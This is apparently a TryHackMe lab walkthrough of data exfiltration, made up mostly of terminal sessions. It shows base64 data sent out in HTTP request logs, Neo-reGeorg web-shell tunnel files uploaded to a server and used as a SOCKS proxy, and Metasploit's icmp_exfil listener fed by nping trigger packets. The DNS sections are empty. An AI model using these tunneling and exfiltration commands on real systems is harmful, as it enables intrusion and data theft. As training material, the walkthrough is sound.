# Room Information

# Room Tasks

## Exfiltrate Using HTTP(S)

### 

```Bash
thm@web-thm:~$ ssh thm@192.168.0.100
thm@192.168.0.101's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep  5 23:48:55 2023 from 192.168.0.133
To run a command as administrator (user "root"), use "sudo <command
>".
See "man sudo_root" for details.

thm@web-thm:~$ 
```

```Bash
thm@web-thm:~$ sudo ls -ali /var/log/apache2/
total 24
1028090 drwxr-x--- 1 root adm  4096 Jun 20  2022 .
1028089 drwxr-xr-x 1 root root 4096 May 13  2022 ..
1028091 -rw-r--r-- 1 root root  439 Sep  5 21:49 access.log
1028092 -rw-r----- 1 root adm  1400 Sep  5 21:12 error.log
1028093 -rw-r----- 1 root adm     0 May 13  2022 other_vhosts_acces
s.log
```

```Bash
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm: 
192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?fl
ag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.6
8.0"
192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php H
TTP/1.1" 200 395 "-" "curl/7.68.0"
192.168.0.1 - - [20/Jun/2022:06:18:35 +0100] "GET /test.php HTTP/1.
1" 200 195 "-" "curl/7.68.0"
192.168.0.101 - - [05/Sep/2023:21:49:30 +0100] "POST /contact.php H
thm@web-thm:~$ sudo cat /var/log/apache2/error.log
[Mon Jun 20 05:17:07.685620 2022] [mpm_prefork:notice] [pid 23] AH0
0163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operatio
ns
[Mon Jun 20 05:17:07.685673 2022] [core:notice] [pid 23] AH00094: C
ommand line: '/usr/sbin/apache2'
[Mon Jun 20 06:18:25.691061 2022] [core:warn] [pid 8] AH00098: pid 
file /var/run/apache2/apache2.pid overwritten -- Unclean shutdown o
f previous Apache run?
[Mon Jun 20 06:18:25.693080 2022] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Mon Jun 20 06:18:25.693102 2022] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
[Mon Jun 20 07:02:35.845076 2022] [mpm_prefork:notice] [pid 8] AH00
169: caught SIGTERM, shutting down
[Mon Jun 20 19:01:09.285979 2022] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Mon Jun 20 19:01:09.286642 2022] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
[Tue Sep 05 21:12:43.977335 2023] [core:warn] [pid 8] AH00098: pid 
file /var/run/apache2/apache2.pid overwritten -- Unclean shutdown o
f previous Apache run?
[Tue Sep 05 21:12:43.979882 2023] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Tue Sep 05 21:12:43.979907 2023] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
```

### HTTP Tunneling

```Bash
root@ip-10-10-188-127# cd /opt/Neo-reGeorg
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# firefox http://10.10.83.6/uploader
```

![]()

![]()

![]()

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py -k thm -uttp://10.10.83.6/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
```

```Bash
curl --socks5 127.0.0.1:1080 http://172.20.0.120
<p><a href="/flag">Get Your Flag!</a></p>
```

```Bash
root@ip-10-10-188-127:~# curl --socks5 127.0.0.1:1080 http://172.20.0.120/flag
<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}</p>
```

## Exfiltration Using ICMP

```Bash
root@ip-10-10-228-244:~# msfconsole -q
msf6 >
```

```Bash
msf6 > use icmp_exfil

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                   normal  No     ICMP Exfiltration Service


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/icmp_exfil

[*] Using auxiliary/server/icmp_exfil
msf6 auxiliary(server/icmp_exfil) >
```

```Bash
msf6 auxiliary(server/icmp_exfil) > show options

Module options (auxiliary/server/icmp_exfil):

   Name            Current Settin  Required  Description
                   g
   ----            --------------  --------  -----------
   BPF_FILTER      icmp            yes       BFP format filter to l
                                             isten for
   END_TRIGGER     ^EOF            yes       Trigger for end of fil
                                             e
   FNAME_IN_PACKE  true            yes       Filename presented in
   T                                         first packet straight
                                             after START_TRIGGER
   INTERFACE                       no        The name of the interf
                                             ace
   RESP_CONT       OK              yes       Data ro resond when co
                                             ntinuation of data exp
                                             ected
   RESP_END        COMPLETE        yes       Data to response when
                                             EOF received and data
                                             saved
   RESP_START      SEND            yes       Data to respond when i
                                             nitial trigger matches
   START_TRIGGER   ^BOF            yes       Trigger for beginning
                                             of file


View the full module info with the info, or info -d command.
```

```Bash
msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src 10.10.228.244
BPF_FILTER => icmp and not src 10.10.228.244
```

```Bash
msf6 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on persistad (10.50.83.62). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)

```

```Bash
thm@jump-box:~$ ssh thm@icmp.thm.com
thm@icmp.thm.com's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted b
y
applicable law.

To run a command as administrator (user "root"), use "sudo <command
>".
See "man sudo_root" for details.

thm@icmp-host:~$
```

```Bash
thm@jump-box:~$ ssh thm@icmp.thm.com
[sudo] password for thm: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Sep  6 00:47:45 2023 from 10.100.1.130
To run a command as administrator (user "root"), use "sudo <command
>".
See "man sudo_root" for details.

thm@jump-box:~$ ssh thm@icmp.thm.com
thm@icmp.thm.com's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Sep  6 01:19:09 2023 from 192.168.0.133
To run a command as administrator (user "root"), use "sudo <command
>".
See "man sudo_root" for details.

thm@icmp-host:~$
```

```Bash
thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.228.244 --data-string
 "BOFfile.txt"
[sudo] password for thm: 

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2023-09-06 01:3
2 EEST
SENT (0.0388s) ICMP [192.168.0.121 > 10.10.228.244 Echo request (ty
pe=8/code=0) id=25941 seq=1] IP [ttl=64 id=48940 iplen=39 ]
RCVD (0.0399s) ICMP [10.10.228.244 > 192.168.0.121 Echo reply (type
=0/code=0) id=25941 seq=1] IP [ttl=63 id=56995 iplen=39 ]
 
Max rtt: 0.938ms | Min rtt: 0.938ms | Avg rtt: 0.938ms
Raw packets sent: 1 (39B) | Rcvd: 1 (39B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
```

```Bash
thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.228.244 --data-string
 "getFlag"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2023-09-06 01:3
3 EEST
SENT (0.0399s) ICMP [192.168.0.121 > 10.10.228.244 Echo request (ty
pe=8/code=0) id=22069 seq=1] IP [ttl=64 id=64232 iplen=35 ]
RCVD (0.0404s) ICMP [10.10.228.244 > 192.168.0.121 Echo reply (type
=0/code=0) id=22069 seq=1] IP [ttl=63 id=64998 iplen=35 ]
 
Max rtt: 0.349ms | Min rtt: 0.349ms | Avg rtt: 0.349ms
Raw packets sent: 1 (35B) | Rcvd: 1 (35B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
```

```Bash
thm@icmp-host:~$ ls /tmp
flag.txt
```

```Bash
thm@icmp-host:~$ cat /tmp/flag.txt 
THM{g0t-1cmp-p4k3t!}
```

## Exfiltration Over DNS

## DNS Tunneling

